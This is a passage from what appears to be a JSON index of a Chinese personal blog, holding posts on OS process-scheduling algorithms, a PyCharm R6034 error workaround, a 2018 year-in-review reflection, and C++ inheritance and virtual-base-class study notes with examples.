按照作业提交的先后次序，从后备队列中选择几个最先进入该队列的作业，将它们调入内存，为它们分配资源和创建进程，然后放入就绪队列。\n进程调度 从就绪队列中选择一个最先进入该队列的进程，为它分配CPU，使之运行；该进程一直运行到完成或发生阻塞。\n在进程被唤醒后（如I/O完成），并不立即恢复执行，通常等到当前进程出让CPU。\n特点： 简单、易于实现、服务质量不佳。\n取决于作业（进程）提交顺序。\n较有利于长作业（进程）或CPU繁忙型的作业。\n不利于短作业（进程）或I/O繁忙型作业。\n用途： 既可用于作业调度，也可用于进程调度。\n很少作为进程调度的主要算法，但常作为辅助调度算法。\n进程名 到达时间 服务时间 开始执行时间 完成时间 周转时间 带权周转时间 A 0 1 0 1 1 1 B 1 100 1 101 100 1 C 2 1 101 102 100 100 D 3 100 102 202 199 1.99 周转时间：周转时间 = 完成时间 - 到达时间\n平均周转时间：$ T=\\frac{1}{n}\\sum_{i=1}^n T_i $\n带权周转时间：$带权周转时间 = \\frac{周转时间}{服务时间}$\n平均带权周转时间：求和取平均\n（2）SJF 作业调度 从外存的作业后备队列中选择若干个估计运行时间最短的作业，优先将它们调入内存运行。\n进程调度 对预计执行时间短的进程优先分配处理机。\n特点 能显著改善作业的平均周转时间。\n在降低作业的平均等待时间同时，提高系统吞吐量。\n必须预知作业的运行时间。\n对长作业非常不利（饥饿）。\n人机无法实现交互。\n未考虑作业的紧迫程度。\n用途 可分别用于作业调度和进程调度。\n4.优先级调度算法（PSA）和高响应比优先调度算法（HRRN） （1）PSA（Priority-Scheduling Algorithm） 基本思想：基于作业的紧迫程度，由外部赋予作业相应的优先级，调度时按优先级的高低进行调度。 应用范围：用于批处理系统中的作业调度算法、多种操作系统及实时系统中的进程调度算法。 作业调度：从后备队列中选择若干个优先权最高的作业调入内存。 进程调度：是把处理机分配给就绪队列中具有最高优先权的进程。 （2）HRRN（Highest Response Ratio Next） $优先权 = \\frac{等待时间+要求服务时间}{要求服务时间} = \\frac{响应时间}{要求服务时间} = R_p$\n是一种__动态优先权调度算法__。\n调度规则：在当前作业完成或被阻塞时，选择$R_p$值最大的作业。 特点 照顾了短作业。\n先来先服务，等待时间越短，$R_p$越小。\n不会使长作业长时间得不到服务，因为随着等待时间的增的，$R_p$也在增大，从而获得处理机。\n缺点：增加系统开销。因为每次调度时，都要进行响应比$R_p$的计算。 更新于 2019/01/23 \u0026mdash; 21:51\n三.进程调度 1.进程调度的任务、机制和方式 （1）进程调度的任务 保存处理机的现场信息（当前进程的） 按某种算法选取进程 把处理机分配给进程（装入现场信息） （2）进程调度中的三个基本机制 排队器：将系统中所有就绪进程按一定的方式排成一个或多个队列。 分派器：把由进程调度程序所选定的程序，从就绪队列中取出，进行从分派队列进程到新选出进程间的上下文切换，将处理机分配给它。 上下文切换机制 对处理机进行切换时，会发生两对上下文切换操作：\n第一对上下文切换时，OS将保存当前进程的上下文，装入分派程序的上下文；第二对上下文切换时，移出分派程序，把新选进程的CPU现场信息装入到处理机的各个相应寄存器中。\n（3）进程调度方式 非抢占方式（Nonpreemptive Mode） 引起调度的原因：\n1）正在执行的进程执行完毕，或因发生某事件而不能再继续执行。\n2）执行中的进程因提出I/O请求而暂停执行。\n3）在进程通信或同步过程中执行了某种原语操作。\n优点：实现简单，系统开销小，适用于大多数的批处理系统。\n缺点：难以满足紧急任务的要求，不宜用于分时系统和大多数实时系统。\n抢占方式（Preemptive Mode） 抢占调度的原则：\n1）优先权调度原则\n2）短进程优先原则\n3）时间片原则\n优点：可以防止一个长进程长时间占用处理机，能为大多数进程提供更公平的服务。\n缺点：系统开销大。\n2.转轮调度算法（RR） （1）RR调度算法的基本原理 1）将系统中所有就绪进程按照FCFS原则，排成一个队列。\n2）每次调度时将CPU分派给队首进程，让其执行一个时间片。时间片长度从几个ms到几百ms。\n3）在一个时间片结束时，发生时钟中断。\n4）调度程序据此时暂停当前进程的执行，将其送到就绪队列的末尾，并通过上下文切换执行当前的队列队首进程\n5）进程可以未使用完一个时间片，就让出CPU。\n（2）进程切换时机 一个时间片尚未用完 原因：\n1）进程运行结束\n2）进程阻塞\n操作：\n1）立即激活调度程序\n2）调度就绪队列队首的进程运行\n3）启动一个新的时间片\n一个时间片用完时 原因：进程尚未运行结束\n操作：\n1）计时器中断处理程序激活\n2）调度程序将进程送至就绪队列末尾\n（3）时间片大小的确定 太大：响应时间受影响 无穷大：退化为FCFS算法 太小：增加系统开销 选取：时间片大小一般选取略大于一次典型的交互所需要的时间 3.高优先级调度算法 （1）优先级调度算法的类型 非抢占式优先权算法：\n处理机分配给就绪队列优先权最高的进程后，该进程就一直执行下去，直至完成；或因发生某事件使该进程放弃处理机时，才进行CPU的重新分配。\n应用范围：批处理系统、实时性要求不严的实时系统。\n抢占式优先权调度算法：\n处理机分配给就绪队列优先权最高的进程后，只要出现另一个优先权更高的进程时，便停止原来执行进程，把处理机分配给新出现的优先权最高的进程。\n应用范围：实时性要求比较严格的实时系统。\n（2）优先级的类型 静态优先级 进程优先级在创建进程时确定，整个运行期间保持不变。\n确定优先权的依据：\n1）进程类型：系统进程的优先级高于一般用户进程。\n2）进程对资源的需求：资源要求少的进程赋予较高的优先级。\n3）用户要求：根据进程的紧迫程序及用户的付费确定优先级。\n特点：\n1）简单易行，系统开销小，不够精确\n2）可能会出现低优先权作业长期不被调度\n动态优先级 进程创建时赋予的优先权可以随进程的推进或等待时间的增加而改变，以便获得更好的调度性能。\n如：优先权随执行时间而下降，随等待时间而升高。\n优点：长短兼顾，可以防止某类作业长时间垄断CPU。\n缺点：增加了系统开销。\n4.多队列调度算法 描述 1）将不同类型或性质的就绪进程固定分配在不同的就绪队列；\n2）不同的就绪队列采用不同的的调度算法；\n3）一个就绪队列中的进程可以设置不同优先级；\n4）不同的就绪队列本身也可以设置不同的优先级。\n比如：多处理机系统。\n5.多级反馈队列调度算法（MFQ） （1）调度机制 设置多个就绪队列，并为各个队列赋予不同的优先权，第一个队列的优先级最高，优先级依次降低。 赋予各个队列中进程执行时间片的大小也各不相同。优先权愈高，时间片愈小。 新进程进入内存后，放在第一队列未尾，先来先服务；一个时间片内运行不完，则转下一队列。 按队列顺序运行，最后一个队列按时间片轮转，其余按FCFS运行。 仅当第一队列空闲时，调度程序才调度第二队列中的进程运行；仅当第1~（i - 1） 队列均空时，才会调度第i队列中的进程运行。 如果处理机正在第i队列中为某进程服务时，又有新进程进入优先权较高的队列(第1~（i - 1）中的任何一个队列)，则此时须立即把正在运行的进程放回到第 i队列的末尾，把处理机分配给新到的高优先级进程。 （2）调度算法性能 多级反馈队列调度算法：属于抢占式调度方式。 调度算法的性能：具有较好的性能，能照顾到各种用户的利益 终端型作业用户\n短批处理作业用户\n长批处理作业用户\n6.基于公平原则的调度算法 （1）保证调度算法 保证调度算法向用户保证的是明确的性能，可以做到调度的公平性。 保证处理机分配的公平性：如果系统中有n个相同类型的进程同时运行，须保证每个进程都获得相同的处理机时间 $\\frac{1}{n}$。 保证的是每个进程获得相同的处理机时间。 实施公平调度算时，系统必须具备的功能： 1）跟踪计算每个进程自创建以来已经执行的处理时间；\n2）计算每个进程应获得的处理机时间：$T_target = \\frac{T_current - T_create}{n}$.\n3）进程获得处理机时间的比率：$\\frac{T_real}{T_target}$。\n4）比较各进程获得处理机的时间比率。\n5）调度程序选择比率最小的进程，将处理机分配给它，并让该进程一直运行到超过最接近它的进程比率为止。\n（2）公平分享调度算法 调度的公平性是针对用户，所有用户能获得相同的处理机时间，或所要求的时间比例。 例：系统中有2个用户，用户1有4个进程A、B、C、D，用户2只有1个进程E。\n保证两个用户获得相同的处理机时间，则强制调度序列为：A E B E C E D E A E B E C E D E\u0026hellip;\u0026hellip;\n希望用户1获得的处理机时间是用户2的2倍，则强制调度序列为：A B E C D E A B E C D E A B E C D E ……\n四.实时调度 1.实现实时调度的基本条件 （1）提供必要信息 就绪时间 开始或者完成截止时间 处理时间 资源需求 绝对或相对优先级（硬实时或软实时） （2）系统处理能力强 单处理机情况下，要求满足下面限制条件：$ \\sum_{i = 1}^m \\frac{C_i}{P_i} \u0026lt;= 1$（其中$C_i$表示处理时间$P_i$表示周期时间)。 （3）采用抢占式调度机制 以满足HRT任务对截止时间的要求。 （4）具有快速切换机制 对外部中断的快速响应能力 1）系统具有快速硬件终端机构。\n2）在中断处理时（硬件），禁止中断的时间间隔尽量短。\n相应地采用较小的调度单位（如线程），以减少任务切换的时间开销。 2.实时调度算法分类 按实时任务性质分类 硬实时调度算法\n软实时调度算法\n按调度方式分类 非抢占调度算法\n抢占调度算法\n（1）非抢占式调度算法 特点：算法比较简单，易于实现 分类 非抢占式轮转调度算法：秒级的响应时间，适用于一般实时信息处理系统或要求不太严格的实时控制系统\n非抢占式优先级调度算法：秒级至数百毫秒级的响应时间，适用于有一定要求的实时控制系统。\n（2）抢占式调度算法 应用：要求较严格（响应时间为数十毫秒以下）的实时系统。 分类 基于时钟中断的抢占式优先级调度算法：几十毫秒级至几毫秒级的响应时间，用于大多数的实时控制系统。\n立即抢占（Immediate Preemption）的优先级调度算法：一旦出现外部中断，只要当前任务未处于临界资源，便立即剥夺当前任务的执行。调度延迟可低到几毫秒至100微妙。\n3.最早截止时间优先（EDF）算法 该算法是根据任务的开始截止时间来确定任务的优先级，任务的开始截止时间愈早，其优先级愈高。 要求系统中保持一个实时任务就绪队列，该队列按各任务的截止时间的早晚排序。 可采用非抢占调度方式，也可采用抢占调度方式。 （1）非抢占式调度方式用于非周期实时任务 例：对下面5个非周期性实时任务，按最早开始截止时间优先调度算法应如何进行CPU调度？\n进程 到达时间 执行时间 开始截止时间 A 10 20 110 B 20 20 20 C 40 20 50 D 50 20 90 E 60 20 70 （2）抢占式调度方式用于周期实时任务 4.最低松弛度优先（LLF）算法 该算法根据实时任务的松弛度来确定任务的优先级，任务的松弛度愈低，其优先级愈高。 松弛度 = 必须完成时间 - 其本身的运行时间 - 当前时间 要求系统中有一个按松弛度排序的实时任务就绪队列。 主要用于可抢占调度方式中，当一任务的最低松弛度减为0时，它便立即抢占CPU，以保证按截止时间的要求完成任务。 例：若A进程需在200ms时完成，其本身运行需要100ms，当前时刻是10ms，则A的松弛度是多少？\nA的松弛度 = 200－100－10 ＝ 90ms\n例：假如在一个实时系统中，有两个周期性实时任务A和B，任务A要求每 20 ms执行一次，执行时间为 10 ms；任务B只要求每50 ms执行一次，执行时间为 25 ms。\n5.优先级倒置 （1）优先级倒置的形成 形成：OS广泛采用优先级调度算法和抢占调度方式，而系统中存在着影响进程运行的资源，可能产生“优先级倒置”的现象，即一个低优先级的任务持有一个被高优先级任务所需要的共享资源，高优先任务由于因资源缺乏而处于阻塞状态，一直等到低优先级任务释放资源为止。 优先级倒置的例子：有三个独立的并发进程P1、P2、P3，它们的优先级为： P1\u0026gt;P2\u0026gt;P3，P1与P3均会使用到一个临界资源。\nP1: …P(mutex); CS-1; V(mutex); …\nP2: … program2; …\nP3: … P(mutex); CS-3; V(mutex); …\n（2）优先级倒置的解决方法 设置优先级上限：给临界区一个高优先级，进入临界区的进程都将获得这个高优先级，如果其他试图进入临界区的进程的优先级都低于这个高优先级，那么优先级反转就不会发生。 优先级继承：当一个高优先级进程等待一个低优先级进程持有的资源时，低优先级进程将暂时获得高优先级进程的优先级别，在释放共享资源后，低优先级进程回到原来的优先级别。 使用中断禁止：通过禁止中断来保护临界区，采用此种策略的系统只有两种优先级：可抢占优先级和中断禁止优先级。前者为一般进程运行时的优先级，后者为运行于临界区的优先级。 更新于 2019/01/24 \u0026mdash; 14:46\n至此前四部分完成，接下来第二篇会写死锁。\n","date":"2019-01-22T20:03:57+08:00","permalink":"https://lizonglingo.github.io/p/%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6%E4%B8%8E%E6%AD%BB%E9%94%81%E4%B8%80/","title":"处理机调度与死锁(一)"},{"content":" 刚放假的时候更新了Pycharm,结果以后每次打开的时候都会出现报错。没有试过重装，用了稍微有些麻烦的方法。\n错误提示 打开Pycharm，等一切准备工作就绪，会弹出如下错误提示：\n大部分出现此类状况的应该是py3.6及以上的解释器，py2.7版本好像不会出现此类状况。本人的环境是3.7版本，这可能是由于Output Window:app.exe 中的 0x7c984ed1 处最可能的异常: 0xC0000142: DLL Initialization Failed，或者也有可能和Microsoft C++ Runtime Library有关系。\n解决方法 这个解决方法可能比较粗暴···\n每次打开Pycharm之前，先找到运行的项目所使用的解释器的python.exe文件目录下，将python.exe文件copy一份并且命名为python_copy.exe，接着删除python.exe。然后我们打开Pycharm，就绪之后会提示如下错误：\n这个时候，我们把刚才的python_copy.exe文件名改成python.exe,然后再次运行Pycharm发现可以正常运行并且报错也不会出现了。\n参考：\nhttps://blog.csdn.net/qq_26671365/article/details/69388085\nhttps://segmentfault.com/q/1010000008713302/a-1020000008714990\n","date":"2019-01-18T12:37:40+08:00","permalink":"https://lizonglingo.github.io/p/%E6%9A%82%E6%97%B6%E8%A7%A3%E5%86%B3pycharm%E5%87%BA%E7%8E%B0runtime-error-r6034%E7%9A%84%E6%8A%A5%E9%94%99/","title":"暂时解决Pycharm出现Runtime Error R6034的报错"},{"content":" 今天是19年1月17日，好久之前就打算写点东西说说去年发生的故事，现在终于有时间和条件来盘了。\n过去的 ​\t18年给我的感觉是信息爆炸的一年，发生的很多事情像流星雨一样一闪而过没留下清晰的记忆。它们是令我焦灼，疲惫的；令我感到无所适从却有时又会期待的；或者是让我能感到收获和幸福的。\n​\t我想下面用时间线来描述可能更清楚也更有代入感。\n​\t一年级下学期，3月份开学。开学之后没多久就开始准备转专业考试，因为这个缘故班级里的一些事物也确实不太上心，另一方面也不太想掺乎这些事情。大概4、5月份的时候考的试，得知通过之后也有更努力的准备期末考试，还好理论力刚刚过就高了几分。顺利转到cs专业继续接下来的学习。\n​\t很感谢原来学院的辅导员张老师，一年级时候跟张老师干活学到了很多东西，收益匪浅。感谢班主任李老师在一开学时就指明路，后来也确实少走了许多弯路。还要感谢制图杨老师，理论力纪老师，高数滕老师，在她们的课上收获了许多远比知识都要重要的东西。更要感谢原来班级的同学对一年级一年工作的帮助和支持。\n​\t实话讲转专业是入学以来一直的一个心愿，很幸运没有很费劲就实现了。\n​\t二年级上学期过的是贼快，每天充斥着上课实验和VS2017。那段最忙的时间从早上醒来就开始盼着晚上上床睡觉。\n​\t二年级开学提前去了两天搬了宿舍，新的舍友都很nice而且学习是真的不虚，压力···不过后来发现大家都是沙雕哈哈哈 :-) 然后就是一个慢慢熟悉的过程，st宿舍的学习氛围跟那赶大集一样热闹的不行（脑补一群只会写hello world的沙雕改bug情景），和宿舍的暖气管子一样热，热的王老师把床铺搬到了地板上，在地上过完二年级上学期最后一个月的所有夜晚。说到夜晚，还记得那场流星雨吗？我记得是双子座流星雨。那天晚上男生宿舍的天台上一对一对的，男生们手挽手，搂着小腰，睡衣外面套着羽绒服，穿着小棉拖在天台发出一阵阵狼嚎，真美好ya。还好还好，前天所有成绩都出了都考得还可以。有惊无险的过去了。\n​\t我搬宿舍带过去的一盆多肉拼盘都驾鹤西去了···还有三盆单株在宿舍不知道能不能挺过这个寒冬，挺过了开学就得换大盆辽。这个学期觉得自己遇到好多贵人在迷茫的时候又帮我拨开那云雾缭绕，遇到了很上心的学业导师熊，然后认识了研究生师兄师姐，间接参与了一个项目。极大程度上认识到了自己脑子里那点东西一瓶盖都装不满的，希望现在不要太晚。从此坚定了要做一个执着追求技术的人（其实我梦想是发财）！\n想列一下今年的书架上的新面孔：\n前半年有继续读马尔克斯\n霍乱时期的爱情（推荐） 一个海难幸存者的故事 没有人给他写信的上校 一桩事先张扬的凶杀案 枯枝败叶 之后是教父，第三部还没读\n教父（推荐） 教父-西西里人 然后开始读阿加莎和奎因的推理\n悲剧系列 X的悲剧（推荐） Y的悲剧（推荐） Z的悲剧 罗杰疑案（推荐） 希腊棺材之谜 尼罗河上的惨案 最近马上开始的\n白鹿原 月亮和六便士 学习方面：\nC Primer Plus (垫桌子了) C++ Primer Plus Python编程从入门到实践 （推荐） Head First Java 深入理解计算机系统（推荐） 差不多就是这些，我觉得上了大学语文功底退化了，之前喜欢看散文随笔，现在欣赏不来···\n​\t乐队方面也是嘿嘿，两开花。二年级乐队重组了，是想要的那些他。在家门口用上了五位数的箱子并且客串了和声，排了好多曲子，串了好多场子。看了现场极稳的丢火车和蹦迪蹦到裤子湿透的反光镜。明年可能要暂时离开。\n​\t突然觉得文字苍白，肚子里墨水太少了我也···总之18年是忙碌疲惫但是收获满满并且有意外惊喜的一年，很满足辽。\n现在的 ​\t这个假期把驾照考出来，Python和Java入了门再看看计组就齐活了，也懒得出去看大好山河 :-(\n以后的 ​\t明年有什么打算吗？有的吧\n上手几个项目 要多运动，肚子好大了已经 希望可以少耍手机估计不太现实 花更多的票子买书并且都看 绩点肯定越高越好 如果有条件还是想多去几个地方 少熬夜要早起 无限可能···· 还给自己留了一个彩蛋 会努力成真di\n写于\n2019年1月18日 0点57分\nGoodnight 祝大家明年暴富\n","date":"2019-01-17T23:17:56+08:00","permalink":"https://lizonglingo.github.io/p/%E4%B8%8D%E7%BB%8F%E6%84%8F%E9%97%B4%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E6%98%A5%E5%A4%8F%E7%A7%8B%E5%86%AC/","title":"不经意间又是一个春夏秋冬"},{"content":" 这篇是继承与派生\nC++基础复习—— 继承 1.继承与派生 C++继承的几个特点： (1) 一个派生类可以有一个或多个基类，只有一个基类时，称为单继承；有多个基类时称为多继承。 (2) 继承关系可以是多级的。 (3) 不允许循环继承。 (4) 基类中能够被继承的部分只能是公有成员和保护成员，私有成员不能被继承。\n单继承 说明： （1）在派生类定义中，继承方式只限定紧跟其后的那个基类。如果不显示给出继承方式系统默认私 有继承。 （2）派生方式有三个关键字，public private protected除此之外，缺省的方式默认私有继承。\n派生类实现方式：吸收 改造（主要通过同名覆盖实现） 添加\n多继承定义格式：class 派生类名:继承方式1 基类名1,继承方式2 基类名2，··· (继承方式缺省默认私有继承)\n基类与派生类的关系： 1)派生类是基类的具体化 2)派生类是基类定义的延续 3)派生类是基类的组合\n2.派生类的访问控制 公有继承：\n基类 派生类 派生类内 派生类外\rpublic -\u0026gt; public 可使用 不可使用\rprivate -\u0026gt; 不可访问 不可使用 不可使用\rprotected -\u0026gt;protected 可使用 可通过成员函数访问\r私有继承： 基类 派生类 派生类内 派生类外 public -\u0026gt; private 可使用 不可直接使用 protected-\u0026gt; private 可以使用 不可直接使用 private -\u0026gt; 不可访问 不能直接使用 不能直接使用（只能通过调用基类函数成员\n3.派生类的构造函数和析构函数 派生类的构造函数：在派生类对象的成员中，从基类继承来的成员被封装为基类的子对象，他们的初始化由派生类的构造函数隐含调用基类构造函数进行初始化；派生类新增数据成员则在派生类自己定义的构造函数中进行初始化。对象在使用之前必须初始化，对派生类对象初始化之时，需要对该类数据成员赋初值。由于派生类数据成员是由所有基类成员与派生类新成员共同组成的，所以这里要注意参数是否与所有要初始化的参数相匹配。\n派生类构造函数的调用规则 1)单继承的构造函数调用顺序 调用基类构造函数-\u0026gt;调用内嵌成员对象的构造函数-\u0026gt;调用顺序取决于他们在类中定义的顺序-\u0026gt;派生类自己的构造函数。\n例题（包括子对象条件下）\nclass Base1 //基类 { public: Base1(int i) { a = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base1 a=\u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; } private: int a; }; class Base2 //子对象f所属类 { public: Base2(int i) { b = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base2 b=\u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; } private: int b; }; class Base3 //子对象g所属类 { public: Base3(int i) { c = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base3 c=\u0026#34; \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl; } private: int c; }; class Derivedclass :public Base1 //派生类 { public: Derivedclass(int i, int j, int k, int m); private: int d; Base2 f; //子对象f Base3 g; //子对象g }; Derivedclass::Derivedclass(int i, int j, int k, int m) :Base1(i), g(j), f(k) { d = m; cout \u0026lt;\u0026lt; \u0026#34;constructing Derivedclass d=\u0026#34; \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl; } int main() { Derivedclass x(5, 6, 7, 8); return 0; } 下面是调试结果： constructing Base1 a=5 constructing Base2 b=7 constructing Base3 c=6 constructing Derivedclass d=8 *注意：子对象f和g的调用顺序取决于他们在派生类中被说明的顺序，与他们在成员初始化列表中的 顺序无关。 好了看完这个例子我们来总结一下派生类构造函数格式： 派生类名(参数总表):基类名1(参数表1),···,基类名m(参数表m),成员对象名1(成员对象参数表1),···成员对象n(成员对象参数表n) {\n·······\n}；\n2)多继承的构造函数调用顺序 多继承下派生类的构造函数必须同时负责该派生类所有基类构造函数的调用。构造函数的调用顺序是： 先调用所有基类的构造函数，再调用派生类的构造函数。处于同一层次的各基类构造函数的调用次序 取决于定义派生类所指定的基类顺序，与派生类构造函数中所定义的初始化列表顺序无关。 *对于同一个基类不允许直接继承两次 我们来感受一下\n例题：\nclass Base1 { public: Base1(int i) { a = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base1 a=\u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; } private: int a; }; class Base2 { public: Base2(int i) { b = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base2 b=\u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; } private: int b; }; class Derivedclass :public Base1, public Base2 { public: Derivedclass(int i, int j, int k); private: int d; }; Derivedclass::Derivedclass(int i, int j, int k) :Base2(i), Base1(j) { d = k; cout \u0026lt;\u0026lt; \u0026#34;constructing Derivedclass d=\u0026#34; \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl; } int main() { Derivedclass x(5, 6, 7); return 0; } 调试结果如下： constructing Base1 a=6 constructing Base2 b=5 constructing Derivedclass d=7 由于在声明派生类时，Base1在Base2之前，所以不关派生类构造函数参数列表的顺序如何，都要先 构造Base1，就是这个道理。\n3)派生类的析构函数\n析构函数调用规则如下： 首先调用派生类的析构函数（清理派生类新增成员）-\u0026gt;如果派生类有子对象,再调用子对象类的析构 函数-\u0026gt;再调用普通基类的析构函数（清理从基类继承来的基类子对象）-\u0026gt;最后调用虚基类的析构函数 例题：\nclass Base1 { public: Base1(int i) { a = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base1 a=\u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; } ~Base1() { cout \u0026lt;\u0026lt; \u0026#34;destructing Base1\u0026#34; \u0026lt;\u0026lt; endl; } private: int a; }; class Base2 { public: Base2(int i) { b = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base2 b=\u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; } ~Base2() { cout \u0026lt;\u0026lt; \u0026#34;destructing Base2\u0026#34; \u0026lt;\u0026lt; endl; } private: int b; }; class Base3 { public: Base3(int i) { c = i; cout \u0026lt;\u0026lt; \u0026#34;constructing Base3 c=\u0026#34; \u0026lt;\u0026lt; c \u0026lt;\u0026lt;endl; } ~Base3() { cout \u0026lt;\u0026lt; \u0026#34;destructing Base3\u0026#34; \u0026lt;\u0026lt; endl; } private: int c; }; class Derivedclass :public Base1 { public: Derivedclass(int i, int j, int k, int m); ~Derivedclass(); private: int d; Base2 f; Base3 g; }; Derivedclass::Derivedclass(int i, int j, int k, int m) :Base1(i), g(j), f(k) { d = m; cout \u0026lt;\u0026lt; \u0026#34;constructing Derivedclass d=\u0026#34; \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl; } Derivedclass::~Derivedclass() { cout \u0026lt;\u0026lt; \u0026#34;destructing Derivedclass\u0026#34; \u0026lt;\u0026lt; endl; } int main() { Derivedclass x(5, 6, 7, 8); return 0; } 调试结果如下： constructing Base1 a=5 constructing Base2 b=7 constructing Base3 c=6 constructing Derivedclass d=8 destructing Derivedclass destructing Base3 destructing Base2 destructing Base1\n4.多继承 多继承语法： class 派生类名: 访问区分符 基类1的类名,···, 访问区分符 基类n的类名\n*多继承中的二义性及其解决 引例：\nclass A { public: void fun() { cout\u0026lt;\u0026lt;\u0026#34;调用A类成员函数\u0026#34; \u0026lt;\u0026lt; endl; } }; class B { public: void fun() { cout \u0026lt;\u0026lt; \u0026#34;调用B类成员函数\u0026#34; \u0026lt;\u0026lt; endl; } }; class C { public: void funC() { cout \u0026lt;\u0026lt; \u0026#34;调用C类成员函数\u0026#34; \u0026lt;\u0026lt; endl; } }; class D :public B, public A, public C { public: void fun() { cout \u0026lt;\u0026lt; \u0026#34;调用D类成员函数\u0026#34; \u0026lt;\u0026lt; endl; } }; int main() { D d; d.fun(); d.funC(); return 0; } 调试结果如下： 调用D类成员函数 调用C类成员函数 我们发现，派生类的成员函数覆盖了基类中所有与之重名的成员函数，这一规则对于数据成员同样 适用。 由此来看二义性的产生：如果只是基类与基类有同名函数成员，存在二义性，系统不能自行判断他们 派生类C的对象访问是的成员中的哪一个。\n二义性的解决办法： 1）成员名限定：通过类作用域分辨符明确限定出现歧义的成员是继承自哪一个基类成员 2）成员重定义：在派生类中新增一个与基类成员相同的成员，由于同名覆盖，程序自动选择派生类 新增的成员。\n多继承中构造函数和析构函数调用顺序 多继承情况下，基类及派生类的构造函数是按照以下顺序被调用的： (1)按基类被列出的顺序逐一调用基类构造函数 (2)如果该派生类存在对象成员，则调用成员对象的构造函数 (3)如果存在多个对象成员，按他们被列出的顺序逐一调用 (4)最后调用派生类构造函数 而析构函数调用顺序与构造函数的调用顺序正好相反 例题：\nclass HairColor { private: int color; public: HairColor(int color) { cout \u0026lt;\u0026lt; \u0026#34;Constructor of class HairColor called\u0026#34; \u0026lt;\u0026lt; endl; this-\u0026gt;color = color; } ~HairColor() { cout \u0026lt;\u0026lt; \u0026#34;Destructor of class HairColor called\u0026#34; \u0026lt;\u0026lt; endl; } }; class Horse { public: Horse() { cout \u0026lt;\u0026lt; \u0026#34;Constructor of class Horse called\u0026#34; \u0026lt;\u0026lt; endl; } ~Horse() { cout \u0026lt;\u0026lt; \u0026#34;Destructor of class Horse called\u0026#34; \u0026lt;\u0026lt; endl; } }; class Donkey { public: Donkey() { cout \u0026lt;\u0026lt; \u0026#34;Constructor of class Donkey called\u0026#34; \u0026lt;\u0026lt; endl; } ~Donkey() { cout \u0026lt;\u0026lt; \u0026#34;Destructor of class Donkey called\u0026#34; \u0026lt;\u0026lt; endl; } }; class Mule :public Horse, public Donkey { private: HairColor hcInstance; public: Mule(int color) :hcInstance(color) { cout \u0026lt;\u0026lt; \u0026#34;Constructor of class Mule called\u0026#34; \u0026lt;\u0026lt; endl; } ~Mule() { cout \u0026lt;\u0026lt; \u0026#34;Destructor of class Mule called\u0026#34; \u0026lt;\u0026lt; endl; } }; int main() { Mule muleInstance(100); cout \u0026lt;\u0026lt; \u0026#34;Program over\u0026#34; \u0026lt;\u0026lt; endl; return 0; } 调试结果如下： Constructor of class Horse called Constructor of class Donkey called Constructor of class HairColor called Constructor of class Mule called Program over Destructor of class Mule called Destructor of class HairColor called Destructor of class Donkey called Destructor of class Horse called\n5.虚基类 （1）多重派生的基类拷贝 引例：\nclass A { public: int x; A(int a){x=a;} }; class B:public A { public: int y; B(int a,int b):A(b){y=a;} }; class C:public A { public: int z; C(int a,int b):A(b) { z=a; } }; class D:public B,public C { public: int m; D(int a,int b,int d,int e,int f):B(a,b),C(d,e) { m=f; } void Print() { cout\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;B::x\u0026lt;\u0026lt;\u0026#39;\\t\u0026#39;\u0026lt;\u0026lt;\u0026#34;y=\u0026#34;\u0026lt;\u0026lt;y\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;C::x\u0026lt;\u0026lt;\u0026#39;\\t\u0026#39;\u0026lt;\u0026lt;\u0026#34;z=\u0026#34;\u0026lt;\u0026lt;z\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;m=\u0026#34;\u0026lt;\u0026lt;m\u0026lt;\u0026lt;endl; } } int main() { D d1(100,200,300,400,500); d1.Print(); return 0; } 调试结果如下： x=200 y=100 x=400 z=300 m=500\n虚基类的定义 定义格式： class \u0026lt;派生类名\u0026gt;:virtual \u0026lt;虚基类名\u0026gt; or class \u0026lt;派生类名\u0026gt;: virtual \u0026lt;虚基类名\u0026gt;\n例题：定义虚基类，使派生类中只有基类的一个拷贝\nclass A { public: int x; A(int a=0) { x=a; } }; class B:virtual public A { public: int y; B(int a,int b):A(b) { y=a; } }; class C:public virtual A { public: int z; C(int a,int b):A(b) { z=a; } }; class D:public B,public C { public: int m; D(int a,int b,int d,int e,int f):B(a,b),C(d,e){m=f;} void Print() { cout\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;x\u0026lt;\u0026lt;\u0026#39;\\t\u0026#39;\u0026lt;\u0026lt;\u0026#34;y=\u0026#34;\u0026lt;\u0026lt;y\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;x\u0026lt;\u0026lt;\u0026#34;\\t\u0026#34;\u0026lt;\u0026lt;\u0026#34;z=\u0026#34;\u0026lt;\u0026lt;z\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;m=\u0026#34;\u0026lt;\u0026lt;m\u0026lt;\u0026lt;endl; } }; int main() { D d1(100,200,300,400,500); d1.Print(); d1.x=400; d1.Print(); return 0; } 调试结果如下： x=0 y=100 x=0 z=300 m=500 x=400 y=100 x=400 z=300 m=500 有虚基类时，多继承方式下构造函数的调用顺序 例题\nclass base1 { public: 